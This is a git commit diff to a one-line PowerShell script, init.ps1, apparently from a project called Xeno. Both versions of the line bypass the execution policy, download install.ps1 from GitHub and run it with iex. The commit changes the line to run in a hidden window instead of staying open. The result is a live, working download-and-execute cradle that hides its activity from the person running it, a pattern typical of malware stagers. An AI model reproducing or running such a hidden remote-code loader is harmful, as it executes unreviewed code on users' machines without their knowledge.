32726eacb06820c37d1537f7e27feef7e2c55990
benjikad <123773963+benjikad@users.noreply.github.com>
2025-08-18 19:05:31 -0400

    Update init.ps1

--- init.ps1
+++ init.ps1
@@ -1,1 +1,1 @@
-powershell -ExecutionPolicy Bypass -NoExit -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/benjikad/Xeno/refs/heads/main/install.ps1'))"
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/benjikad/Xeno/refs/heads/main/install.ps1'))"
